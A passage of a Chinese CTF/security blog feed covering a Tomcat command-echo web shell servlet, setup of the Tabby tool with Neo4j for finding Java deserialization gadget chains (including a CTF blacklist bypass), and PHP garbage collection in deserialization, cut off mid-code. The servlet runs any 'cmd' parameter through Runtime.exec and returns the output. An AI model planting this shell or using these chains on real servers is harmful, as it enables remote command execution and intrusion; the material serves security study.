class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.connector.Connector;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardService;<br><span class="hljs-keyword">import</span> org.apache.coyote.ProtocolHandler;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestGroupInfo;<br><span class="hljs-keyword">import</span> org.apache.coyote.RequestInfo;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;<br> <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br> <br><span class="hljs-meta">@WebServlet(&quot;/response&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat_Echo_Response</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br> <br>        <span class="hljs-comment">//获取StandardService</span><br>        org.apache.catalina.loader.<span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br> <br>        System.out.println(standardContext);<br> <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取ApplicationContext</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(standardContext);<br> <br>            <span class="hljs-comment">//获取StandardService</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">standardServiceField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;service&quot;</span>);<br>            standardServiceField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardService</span> <span class="hljs-variable">standardService</span> <span class="hljs-operator">=</span> (StandardService) standardServiceField.get(applicationContext);<br> <br>            <span class="hljs-comment">//获取Connector</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">connectorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;connectors&quot;</span>);<br>            connectorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            Connector[] connectors = (Connector[]) connectorsField.get(standardService);<br>            <span class="hljs-type">Connector</span> <span class="hljs-variable">connector</span> <span class="hljs-operator">=</span> connectors[<span class="hljs-number">0</span>];<br> <br>            <span class="hljs-comment">//获取Handler</span><br>            <span class="hljs-type">ProtocolHandler</span> <span class="hljs-variable">protocolHandler</span> <span class="hljs-operator">=</span> connector.getProtocolHandler();<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>            handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>            org.apache.tomcat.util.net.AbstractEndpoint.<span class="hljs-type">Handler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (AbstractEndpoint.Handler) handlerField.get(protocolHandler);<br> <br>            <span class="hljs-comment">//获取内部类AbstractProtocol$ConnectionHandler的global属性</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">globalHandler</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;global&quot;</span>);<br>            globalHandler.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">RequestGroupInfo</span> <span class="hljs-variable">global</span> <span class="hljs-operator">=</span> (RequestGroupInfo) globalHandler.get(handler);<br> <br>            <span class="hljs-comment">//获取processors</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">processorsField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);<br>            processorsField.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);<br> <br>            <span class="hljs-comment">//获取request和response</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">requestField</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);<br>            requestField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">for</span> (RequestInfo requestInfo : requestInfoList)&#123;<br> <br>                <span class="hljs-comment">//获取org.apache.coyote.Request</span><br>                org.apache.coyote.<span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (org.apache.coyote.Request) requestField.get(requestInfo);<br> <br>                <span class="hljs-comment">//通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request</span><br>                org.apache.catalina.connector.<span class="hljs-type">Request</span> <span class="hljs-variable">http_request</span> <span class="hljs-operator">=</span> (org.apache.catalina.connector.Request) request.getNote(<span class="hljs-number">1</span>);<br>                org.apache.catalina.connector.<span class="hljs-type">Response</span> <span class="hljs-variable">http_response</span> <span class="hljs-operator">=</span> http_request.getResponse();<br> <br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> http_response.getWriter();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> http_request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br> <br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(inputStream).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> scanner.hasNext()?scanner.next():<span class="hljs-string">&quot;&quot;</span>;<br>                scanner.close();<br>                writer.write(result);<br>                writer.flush();<br>                writer.close();<br>            &#125;<br> <br> <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010922036.png" alt="image-20230201092245861"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八 (su18.org)</a></p><p><a href="https://xz.aliyun.com/t/7388#toc-2">基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com)</a></p><p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog (goodapple.top)</a></p><p><a href="https://www.kingkk.com/2020/03/Tomcat%E4%B8%AD%E4%B8%80%E7%A7%8D%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95/">Tomcat中一种半通用回显方法 - Kingkk’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tabby安装配置及使用</title>
    <link href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Tabby安装配置及使用"><a href="#Tabby安装配置及使用" class="headerlink" title="Tabby安装配置及使用"></a>Tabby安装配置及使用</h1><h2 id="0x00安装"><a href="#0x00安装" class="headerlink" title="0x00安装"></a>0x00安装</h2><h3 id="Neo4j-Desktop"><a href="#Neo4j-Desktop" class="headerlink" title="Neo4j Desktop"></a>Neo4j Desktop</h3><p>官网直接下 <a href="https://neo4j.com/download/">Neo4j Desktop Download | Free Graph Database Download</a></p><p>下完打开初始化完可以看到数据库版本，下对应版本的APOC插件 </p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321216.png" alt="image-20230501151304382"></p><h3 id="新建Neo4j图数据库"><a href="#新建Neo4j图数据库" class="headerlink" title="新建Neo4j图数据库"></a>新建Neo4j图数据库</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321510.png" alt="image-20230501152338340"></p><p>可以选择更新数据库版本到5.4.0</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321584.png" alt="image-20230501162942114"></p><p>打开数据库旁的<code>···</code>-&gt;<code>Settings...</code>更改以下配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">#允许从本地任意位置载入csv文件(大概在前面几行)</span><br><span class="hljs-comment">#server.directories.import=import</span><br><span class="hljs-comment">#允许 apoc扩展（大概在配置文件末尾部分）</span><br><span class="hljs-attr">dbms.security.procedures.unrestricted</span>=jwt.security.*,apoc.*<br><span class="hljs-comment"># 修改内存相关配置 </span><br><span class="hljs-comment"># 可以通过官方的neo4j-admin来推荐配置内存大小</span><br><span class="hljs-attr">dbms.memory.heap.initial_size</span>=<span class="hljs-number">1</span>G<br><span class="hljs-attr">dbms.memory.heap.max_size</span>=<span class="hljs-number">4</span>G<br><span class="hljs-attr">dbms.memory.pagecache.size</span>=<span class="hljs-number">4</span>G<br></code></pre></td></tr></table></figure><p>配置 apoc 的配置，需要找到配置文件目录，在这个目录下新建 apoc.conf 文件，内容为</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321995.png" alt="image-20230501161001178"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">apoc.import.file.enabled</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">apoc.import.file.use_neo4j_config</span>=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>最后，配置一下 apoc 和 tabby 插件，打开 plugins 目录将对应的 jar 复制到与上面conf同目录下的plugins目录</p><p>tabby插件：<a href="https://github.com/wh1t3p1g/tabby/releases">Releases · wh1t3p1g&#x2F;tabby · GitHub</a> （在env目录里,同时把env里面几个apoc的jar包都<strong>复制</strong>到plugins里）</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321885.png" alt="image-20230501163440727"></p><h3 id="验证配置"><a href="#验证配置" class="headerlink" title="验证配置"></a>验证配置</h3><p>重启数据库后，open-&gt;Neo4j Browser,测试查询语句，查看一下apoc（有30项）和tabby（有两项）的配置</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321101.png" alt="image-20230501163735244"></p><h3 id="简单启动"><a href="#简单启动" class="headerlink" title="简单启动"></a>简单启动</h3><p>在下载的tabby文件夹中新建一个case目录，下面放目标jar,同时修改config&#x2F;settings.properties</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321272.png" alt="image-20230501190832777"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041321030.png" alt="image-20230501191148762"></p><p>使用jdk8启动tabby.jar，命令行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -Xmx6g -jar tabby.jar<br></code></pre></td></tr></table></figure><p>可能出现的报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">java.lang.IllegalStateException: Failed to execute CommandLineRunner<br>at org.springframework.boot.SpringApplication.callRunner(SpringApplication.java:771) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.callRunners(SpringApplication.java:752) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:314) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:1303) [spring-boot-2.7.7.jar!/:2.7.7]<br>at org.springframework.boot.SpringApplication.run(SpringApplication.java:1292) [spring-boot-2.7.7.jar!/:2.7.7]<br>at tabby.App.main(App.java:28) [classes!/:na]<br>at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_341]<br>at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_341]<br>at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_341]<br>....<br></code></pre></td></tr></table></figure><blockquote><p>把config&#x2F;settings.properties中的<code>tabby.cache.isDockerImportPath</code>设置为false，这个选项用于判断当前是否是docker环境,如果是本机直接使用，要设置成false</p></blockquote><h3 id="图数据库索引配置"><a href="#图数据库索引配置" class="headerlink" title="图数据库索引配置"></a>图数据库索引配置</h3><p>可以加快导入&#x2F;删除的速度，只要在Neo4j browser里运行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cql">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;<br>CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;<br>CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;<br>CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;<br>CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);<br>CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);<br>CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);<br>CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);<br>CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);<br>CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);<br>CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);<br>#之后可以运行下面命令来查看表库和数据库信息<br>:schema <br>:sysinfo <br></code></pre></td></tr></table></figure><h2 id="0x01简单使用"><a href="#0x01简单使用" class="headerlink" title="0x01简单使用"></a>0x01简单使用</h2><h3 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h3><p>以找cc链为例，将tabby目录下的配置文件的tabby.build.target该成commons-collections jar所在位置</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322228.png" alt="image-20230504085113381"></p><p>shell运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -Xmx6g -jar tabby.jar<br></code></pre></td></tr></table></figure><blockquote><p>注意要使用java8</p></blockquote><p>成功连接数据库</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322970.png" alt="image-20230504085210709"></p><h3 id="可能的报错"><a href="#可能的报错" class="headerlink" title="可能的报错"></a>可能的报错</h3><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322071.png" alt="image-20230504085257308"></p><blockquote><p>原因：Neo4j数据库未开启，即使数据库未开启，刚开始的info仍显示有”default”数据库</p></blockquote><p>出现下图即表示导入完毕</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322896.png" alt="image-20230504085512803"></p><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>打开Neo4j browser，用以下语句查询CC7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cql">match path=(m1:Method &#123;SIGNATURE:&quot;&lt;java.util.Hashtable: void readObject(java.io.ObjectInputStream)&gt;&quot;&#125;)-[:CALL ]-&gt;(m2:Method &#123;NAME:&quot;reconstitutionPut&quot;&#125;)-[:CALL ]-&gt;(m3:Method &#123;NAME:&quot;equals&quot;&#125;)-[:ALIAS*..2]-(m4:Method)-[:CALL ]-&gt;(m5:Method &#123;NAME:&quot;get&quot;&#125;)-[:ALIAS*1..2]-(m6:Method &#123;NAME:&quot;get&quot;&#125;)-[:CALL]-&gt;(m7:Method &#123;NAME:&quot;transform&quot;&#125;)-[:ALIAS*]-(m8:Method)-[:CALL]-&gt;(m9:Method &#123;IS_SINK:true&#125;)  return path<br></code></pre></td></tr></table></figure><blockquote><p>可以很明显的看到是从Hashtable的readObject为起点，hashtable反序列化时调用<strong>reconstitutionPut方法</strong>，在这个方法的执行流程中会调用equals判断key是否重复，如果调用的是AbstractMap的equals，之后会触发LazyMap的get，之后就是常规的触发transform</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322187.png" alt="image-20230504091827921"></p><blockquote><p>查询结果节点以id显示，点击后可以在右框查看属性</p></blockquote><h4 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h4><ul><li><p>Neo4j中有三种指向：<code>() - [] -&gt; ()</code>、<code>() &lt;- [] - ()</code>和<code>() - [] - ()</code>。顾名思义，前两种就是看箭头方向表示对应的单项关系；最后一种表示双向关系</p></li><li><p>形如<code>[:CALL]</code>的可以认为给调用边起一个别名CALL</p></li><li><p>对于每个节点，SIGNATURE属性存储着完整的方法名称</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322332.png" alt="image-20230504091725958"></p></li><li><p>上述查询语句中equals方法后为<code>[:ALIAS*..2]</code></p><ul><li><code>*1..N</code>的意思即为：如果在1到N层关系中存在路径，将返回开始点和结束点，若缺省开头，则默认从1开始，所以<code>[:ALIAS*..2]</code>表示找两层以内的方法</li></ul></li><li><p>在Neo4j查询语句CQL中可以设定指定方向，如<code>-[:CALL ]-&gt;</code>,而<code>-[:ALIAS*1..2]-</code>没有指定方向，说明关系内的方法只能作为alias,可以理解为从当前节点向外广度延伸以搜索能调用到下一个方法节点的调用链</p></li><li><p>每个节点都有两个属性 IS_SINK IS_SOURCE ，分别代表是否是结尾节点和起始节点</p></li></ul><p>根据查询结果很容易发现调用链</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322538.png" alt="image-20230504123909760"></p><h2 id="0x02CTF中使用"><a href="#0x02CTF中使用" class="headerlink" title="0x02CTF中使用"></a>0x02CTF中使用</h2><p>上面找cc链的过程指向性比较强，在ctf中，可以利用该工具找到两个方法之间的调用链</p><h3 id="长城杯-2022-b4bycoffee"><a href="#长城杯-2022-b4bycoffee" class="headerlink" title="[长城杯 2022]b4bycoffee"></a>[长城杯 2022]b4bycoffee</h3><p>题目给出源码，反编译一下，coffeeBean的toString有个字节码后门</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041322562.png" alt="image-20230504124900205"></p><p>反序列化入口，跟进一下AntObjectInputStream</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323091.png" alt="image-20230504125123715"></p><p>在反序列化时设置了黑名单类，过滤了这些</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException,ObjectBean,ToStringBean,TemplatesImpl,Runtime<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323797.png" alt="image-20230504125216104"></p><p>现在只要触发toString，但是常用的BadAttributeValueExpException被ban了，注意到依赖中存在rome，可以用EqualsBean的hashcode方法可以触发到任意类的toString方法</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323020.png" alt="image-20230504125407054"></p><p>但是这题也可以用tabby找一个readObject-&gt;toString的链子，写出以下查询语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cql">match (source:Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)<br>match (sink:Method &#123;NAME:&quot;toString&quot;&#125;)<br>with source, collect(sink) as sinks<br>call tabby.algo.findJavaGadget(source, sinks, 12, false,true) yield path where none(n in nodes(path) where n.CLASSNAME in [&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.sun.jmx.snmp.SnmpEngineId&quot;,&quot;com.sun.xml.internal.ws.api.BindingID&quot;,&quot;javax.swing.text.html.HTML$UnknownTag&quot;])<br>return path limit 1<br></code></pre></td></tr></table></figure><blockquote><p>设置起始节点为HashMap的readObject，结束节点为toString方法</p><p>之后排除了BadAttributeValueExpException等方法</p><p>tabby内的findJavaGadget接口会通过污点传播，根据java原生反序列化的规则来查找利用链，个参数分别表示起始节点、结束节点、路径的最大节点数、isBackward、depthFirst</p></blockquote><p>非常清晰的jdk原生利用链</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202305041323655.png" alt="image-20230504130444449"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.ctfiot.com/64572.html">Java代码分析工具Tabby在CTF中的运用 | CTF导航 (ctfiot.com)</a></p><p><a href="https://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/">Tabby 源码分析 | m0d9’s blog</a></p><p><a href="https://www.cnblogs.com/ljhdo/p/10929702.html">Neo4j 第九篇：查询数据（Match） - 悦光阴 - 博客园 (cnblogs.com)</a></p><p>[tabby&#x2F;Tabby 食用指北.md at master · wh1t3p1g&#x2F;tabby · GitHub](<a href="https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby">https://github.com/wh1t3p1g/tabby/blob/master/doc/Tabby</a> 食用指北.md)</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP垃圾回收器与反序列化利用</title>
    <link href="/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/"/>
    <url>/2022/10/20/PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP垃圾回收器与反序列化利用"><a href="#PHP垃圾回收器与反序列化利用" class="headerlink" title="PHP垃圾回收器与反序列化利用"></a>PHP垃圾回收器与反序列化利用</h1><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>指php会自动释放程序不再需要的已分配的内存块。</p><h3 id="PHP5-3之前"><a href="#PHP5-3之前" class="headerlink" title="PHP5.3之前"></a>PHP5.3之前</h3><p>采用引用计数的方式，给每个内存对象分配一个计数器，每当内存对象被引用时，计数器+1，引用撤销后(unset())，计数器-1，对技术器&#x3D;0时，对内存对象进行销毁，垃圾回收机制完成，php一个生命周期后会释放此进程&#x2F;线程所占的内容</p><p>存在问题：两个或多个对象相互引用，使得计数器永远不为0，导致内存对象无法被回收</p><h3 id="PHP5-3"><a href="#PHP5-3" class="headerlink" title="PHP5.3"></a>PHP5.3</h3><p>加入复杂算法检测引用环的存在，避免内存泄露。</p><p>每个php变量存在一个叫zval的变量容器中，存储了变量的类型和值，还存储了“is_ref”bool型变量以标识该变量是否属于引用集合；还有一个“refcount”，用于表示指向这个zval变量容器的变量个数，注意，多个变量是可以共用一个变量容器的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-keyword">unset</span>( <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span> );<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>( <span class="hljs-string">&#x27;a&#x27;</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上代码会输出</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">a: (<span class="hljs-attribute">refcount</span>=3, <span class="hljs-attribute">is_ref</span>=0)=&#x27;new string<span class="hljs-string">&#x27; </span><br><span class="hljs-string">a: (refcount=1, is_ref=0)=&#x27;</span>new string<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="PHP7的NTS版本"><a href="#PHP7的NTS版本" class="headerlink" title="PHP7的NTS版本"></a>PHP7的NTS版本</h3><p>在该版本，上述通过赋值同一个变量的情况已经不会再被计数，PHP7中，zval可以被引用计数或不被引用</p><ul><li>对于null，bool，int和double的类型变量，refcount永远不会计数；</li><li>对于对象、资源类型，refcount计数和php5的一致；</li><li>对于字符串，未被引用的变量被称为“实际字符串”。而那些被引用的字符串也不计数</li><li>对于数组，未引用的变量被称为“不可变数组”。其数组本身计数与php5一致，但是数组里面的每个键值对的计数，则按前面三条的规则（即如果是字符串也不在计数）；如果使用opcache，则代码中的常量数组文字将被转换为不可变数组。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;测试字符串引用计数&#x27;</span>;<br><span class="hljs-variable">$a</span> = <span 